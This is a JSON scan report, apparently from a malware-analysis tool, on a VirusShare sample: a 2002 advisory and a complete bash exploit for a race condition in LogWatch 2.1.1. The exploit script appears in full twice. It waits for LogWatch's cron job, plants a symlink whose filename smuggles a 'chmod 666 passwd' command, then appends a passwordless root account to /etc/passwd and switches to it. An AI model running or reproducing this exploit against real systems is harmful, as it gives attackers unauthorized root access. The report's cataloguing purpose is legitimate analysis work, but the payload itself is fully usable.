{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "mkdir": "May create a directory",
            "run": "May run an executable file or a system command",
            "shell": "May run an executable file or a system command",
            "system": "May run an executable file or a system command on a Mac"
        },
        "macro": "--- INTRO ---\n\nLogWatch is a customizable log analysis system. LogWatch parses\nthrough your system's logs for a given period of time and creates a\nreport analyzing areas that you specify, in as much detail as you\nrequire.\n\nThe collected results are reported to a chosen e-mail address,\nroot by default.\n\nLogWatch 2.1.1 is a part of the Red Hat Linux 7.2 distribution,\nenabled by default and daily run by the cron daemon.\n\n--- PROBLEM ---\n\nOn a system running LogWatch, a local user is able to gain\nunauthorized root access, due to a race condition during\nthe temporary directory creation.\n\n--- EXPLOIT ---\n\n\n#!/bin/bash\n    #\n    # March 27 2002\n    #\n    # logwatch211.sh\n    #\n    # Proof of concept exploit code\n    # for LogWatch 2.1.1\n    # Waits for LogWatch to be run then gives root shell\n    # For educational purposes only\n    #\n    # (c) Spybreak <spybreak@host.sk>\n\n\n    SERVANT=\"00-logwatch\" # Logwatch's cron entry\n    SCRIPTDIR=/etc/log.d/scripts/logfiles/samba/\n\n    echo\n    echo \"LogWatch 2.1.1 root shell exploit\"\n    echo '(c) Spybreak <spybreak@host.sk>'\n    echo\n    echo \"Waiting for LogWatch to be executed\"\n     \n    while :; do\n      set `ps -o pid -C $SERVANT`\n        if [ -n \"$2\" ]; then\n          mkdir /tmp/logwatch.$2   \n          ln -s $SCRIPTDIR'`cd etc;chmod 666 passwd #`' /tmp/logwatch.$2/cron\n          break;\n        fi\n    done\n    echo \"Waiting for LogWatch to finish it's work\"\n    while :; do\n      set `ps -o pid -C $SERVANT`\n        if [ -z \"$2\" ]; then\n          ls -l /etc/passwd|mail root\n          echo master::0:0:master:/root:/bin/bash >> /etc/passwd\n          break;\n        fi\n    done\n    su master  "
    },
    "filename": "VirusShare_26509d094a11d67a23e651d2e6fd95a6",
    "filesize": 1655,
    "filetype": "ASCII text",
    "hashes": {
        "md5": "26509d094a11d67a23e651d2e6fd95a6",
        "sha1": "6de166dd8b46a0e7821f2feea4c4cada0b6b723d",
        "sha256": "98ffcd498de4f7ca5cccf49a33a3d679c6ee9645522f117edf6b2e34c567d01a"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "--- INTRO ---",
            "LogWatch is a customizable log analysis system. LogWatch parses",
            "through your system's logs for a given period of time and creates a",
            "report analyzing areas that you specify, in as much detail as you",
            "require.",
            "The collected results are reported to a chosen e-mail address,",
            "root by default.",
            "LogWatch 2.1.1 is a part of the Red Hat Linux 7.2 distribution,",
            "enabled by default and daily run by the cron daemon.",
            "--- PROBLEM ---",
            "On a system running LogWatch, a local user is able to gain",
            "unauthorized root access, due to a race condition during",
            "the temporary directory creation.",
            "--- EXPLOIT ---",
            "#!/bin/bash",
            "    #",
            "    # March 27 2002",
            "    #",
            "    # logwatch211.sh",
            "    #",
            "    # Proof of concept exploit code",
            "    # for LogWatch 2.1.1",
            "    # Waits for LogWatch to be run then gives root shell",
            "    # For educational purposes only",
            "    #",
            "    # (c) Spybreak <spybreak@host.sk>",
            "    SERVANT=\"00-logwatch\" # Logwatch's cron entry",
            "    SCRIPTDIR=/etc/log.d/scripts/logfiles/samba/",
            "    echo",
            "    echo \"LogWatch 2.1.1 root shell exploit\"",
            "    echo '(c) Spybreak <spybreak@host.sk>'",
            "    echo",
            "    echo \"Waiting for LogWatch to be executed\"",
            "     ",
            "    while :; do",
            "      set `ps -o pid -C $SERVANT`",
            "        if [ -n \"$2\" ]; then",
            "          mkdir /tmp/logwatch.$2   ",
            "          ln -s $SCRIPTDIR'`cd etc;chmod 666 passwd #`' /tmp/logwatch.$2/cron",
            "          break;",
            "        fi",
            "    done",
            "    echo \"Waiting for LogWatch to finish it's work\"",
            "    while :; do",
            "      set `ps -o pid -C $SERVANT`",
            "        if [ -z \"$2\" ]; then",
            "          ls -l /etc/passwd|mail root",
            "          echo master::0:0:master:/root:/bin/bash >> /etc/passwd",
            "          break;",
            "        fi",
            "    done",
            "    su master  "
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.283088",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
